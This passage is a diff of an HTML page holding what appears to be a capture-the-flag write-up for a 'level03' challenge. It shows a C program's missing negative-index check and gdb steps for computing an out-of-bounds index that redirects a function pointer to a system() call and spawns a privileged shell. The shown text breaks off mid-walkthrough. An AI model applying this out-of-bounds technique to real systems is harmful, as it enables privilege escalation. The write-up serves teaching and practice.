-  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;fns&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;index&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="err"&gt;char&lt;/span&gt; &lt;span class="err"&gt;buf&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="err"&gt;//&lt;/span&gt; &lt;span class="err"&gt;Truncate&lt;/span&gt; &lt;span class="err"&gt;supplied&lt;/span&gt; &lt;span class="err"&gt;string&lt;/span&gt;
+  &lt;span class="err"&gt;strncpy(buf,&lt;/span&gt; &lt;span class="err"&gt;user_string,&lt;/span&gt; &lt;span class="err"&gt;sizeof(buf)&lt;/span&gt; &lt;span class="err"&gt;-&lt;/span&gt; &lt;span class="err"&gt;1)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="err"&gt;buf&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="err"&gt;return&lt;/span&gt; &lt;span class="err"&gt;fns&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;index&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="err"&gt;(buf)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 
-&lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kr"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="nx"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;main&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;argc&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="nt"&gt;argv&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
-  &lt;span class="kr"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;index&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-  &lt;span class="nx"&gt;fn_ptr&lt;/span&gt; &lt;span class="nx"&gt;fns&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;NUM_FNS&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;to_upper&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;to_lower&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;capitalize&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
+  &lt;span class="err"&gt;int&lt;/span&gt; &lt;span class="err"&gt;index&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="err"&gt;fn_ptr&lt;/span&gt; &lt;span class="err"&gt;fns&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;NUM_FNS&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="err"&gt;{&amp;amp;to_upper,&lt;/span&gt; &lt;span class="err"&gt;&amp;amp;to_lower,&lt;/span&gt; &lt;span class="err"&gt;&amp;amp;capitalize,&lt;/span&gt; &lt;span class="err"&gt;&amp;amp;length&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
 
-  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Usage: ./level03 INDEX STRING\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="nx"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Possible indices:\n&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt; to_upper\t&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt; to_lower\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="nx"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt; capitalize\t&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt; length\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="nx"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="nt"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="err"&gt;printf(&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Usage&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;level03&lt;/span&gt; &lt;span class="n"&gt;INDEX&lt;/span&gt; &lt;span class="n"&gt;STRING&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);&lt;/span&gt;
+&lt;span class="s2"&gt;    printf(&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Possible&lt;/span&gt; &lt;span class="n"&gt;indices&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="n"&gt;to_upper&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="n"&gt;to_lower&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);&lt;/span&gt;
+&lt;span class="s2"&gt;    printf(&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="kc"&gt;capitalize&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);&lt;/span&gt;
+&lt;span class="s2"&gt;    exit(-1);&lt;/span&gt;
+&lt;span class="s2"&gt;  }&lt;/span&gt;
+
+&lt;span class="s2"&gt;  // Parse supplied index&lt;/span&gt;
+&lt;span class="s2"&gt;  index = atoi(argv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;);&lt;/span&gt;
+
+&lt;span class="s2"&gt;  if (index &amp;gt;= NUM_FNS) {&lt;/span&gt;
+&lt;span class="s2"&gt;    printf(&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Invalid&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);&lt;/span&gt;
+&lt;span class="s2"&gt;    printf(&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Possible&lt;/span&gt; &lt;span class="n"&gt;indices&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="n"&gt;to_upper&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="n"&gt;to_lower&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);&lt;/span&gt;
+&lt;span class="s2"&gt;    printf(&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="kc"&gt;capitalize&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="err"&gt;exit(-1)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;
 
-  &lt;span class="c1"&gt;// Parse supplied index&lt;/span&gt;
-  &lt;span class="nx"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;argv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-
-  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;index&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="nx"&gt;NUM_FNS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="nx"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Invalid index.\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="nx"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Possible indices:\n&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt; to_upper\t&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt; to_lower\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="nx"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt; capitalize\t&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt; length\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="nx"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-  &lt;span class="p"&gt;}&lt;/span&gt;
-
-  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;truncate_and_call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fns&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;argv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="nt"&gt;return&lt;/span&gt; &lt;span class="nt"&gt;truncate_and_call&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;fns&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;index&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;argv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;In problems like this, the attack surface is usually any place where there is input from the user. For this  reason, our approach is to take a look at the arguments taken in the main function, checking for the common memory and overflow vulnerabilities  in C.&lt;/p&gt;
 &lt;p&gt;A vulnerability is found in the failure of checking for negative inputs:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#define NUM_FNS 4&lt;/span&gt;
-&lt;span class="p"&gt;(...)&lt;/span&gt;
-  &lt;span class="c1"&gt;// Parse supplied index&lt;/span&gt;
-  &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
-  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;NUM_FNS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-     &lt;span class="p"&gt;(...)&lt;/span&gt;
-    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#define NUM_FNS 4
+(...)
+  // Parse supplied index
+  index = atoi(argv[1]);
+  if (index &amp;gt;= NUM_FNS) {
+     (...)
+    exit(-1);
+}
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Moreover, the &lt;strong&gt;index&lt;/strong&gt; variable is used in the function &lt;strong&gt;truncate_and_call&lt;/strong&gt;, where  the function &lt;strong&gt;fns&lt;/strong&gt; can be overflowed:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fn_ptr&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-&lt;span class="p"&gt;(...)&lt;/span&gt;
-&lt;span class="n"&gt;fn_ptr&lt;/span&gt; &lt;span class="n"&gt;fns&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;NUM_FNS&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;to_upper&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;to_lower&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;capitalize&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
-&lt;span class="p"&gt;(...)&lt;/span&gt;
-&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;truncate_and_call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fn_ptr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fns&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;user_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;{&lt;/span&gt;
-  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-  &lt;span class="c1"&gt;// Truncate supplied string&lt;/span&gt;
-  &lt;span class="n"&gt;strncpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-  &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;fns&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;typedef int (*fn_ptr)(const char *);
+(...)
+fn_ptr fns[NUM_FNS] = {&amp;amp;to_upper, &amp;amp;to_lower, &amp;amp;capitalize, &amp;amp;length};
+(...)
+int truncate_and_call(fn_ptr *fns, int index, char *user_string)
+{
+  char buf[64];
+  // Truncate supplied string
+  strncpy(buf, user_string, sizeof(buf) - 1);
+  buf[sizeof(buf) - 1] = &amp;#39;\0&amp;#39;;
+  return fns[index](buf);
+}
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The exploitation plan becomes easier when we notice that right before &lt;strong&gt;truncate_and_call&lt;/strong&gt; we have this convenient function:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;{&lt;/span&gt;
-  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;int run(const char *str)
+{
+  return system(str);
+}
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -191,52 +192,52 @@ chmod +x date
 &lt;p&gt;To understand this problem we need to understand the &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;design of the stack frame&lt;/a&gt;.  With this in mind, the exploit is crafted as follows:&lt;/p&gt;
 &lt;p&gt;1) We input a malicious index that is negative (so it pass the bound checking) to  have a shell running &lt;code&gt;system("/bin/sh");&lt;/code&gt; (which will be able to read password of level3 because it will have its &lt;a href="http://en.wikipedia.org/wiki/User_identifier_(Unix)"&gt;UID&lt;/a&gt;).&lt;/p&gt;
 &lt;p&gt;2) We first need to find the memory location before &lt;strong&gt;fns&lt;/strong&gt; (which should be writable). We fire up &lt;strong&gt;gdb&lt;/strong&gt; and search for the pointer to &lt;strong&gt;buf&lt;/strong&gt;, which is right before &lt;strong&gt;fns&lt;/strong&gt; (this is different each time due to &lt;a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization"&gt;ASLR&lt;/a&gt;):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;  &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;
-    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="mh"&gt;0xffbffa00&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) p  &amp;amp;buf
+    (char (*)[64]) 0xffbffa00
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;3) We  check &lt;strong&gt;index&lt;/strong&gt; (where 4 is &lt;strong&gt;sizeof(*fns)&lt;/strong&gt;), and subtract &lt;strong&gt;buf&lt;/strong&gt; from to the pointer to &lt;strong&gt;fns&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xffbffa6c&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0xffbffa00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
-    &lt;span class="mi"&gt;27&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) p (0xffbffa6c - 0xffbffa00)/4
+    27
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;So running an argument such as &lt;em&gt;/level/level03 -27 foo&lt;/em&gt; calls &lt;strong&gt;fns[-27]&lt;/strong&gt; which is &lt;strong&gt;&amp;amp;fns-27&lt;/strong&gt; times the size of the pointer.&lt;/p&gt;
 &lt;p&gt;4) We will assign &lt;strong&gt;buf&lt;/strong&gt; to a shellcode that will spawn the privileged terminal using the function &lt;strong&gt;run&lt;/strong&gt;, which is at:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;
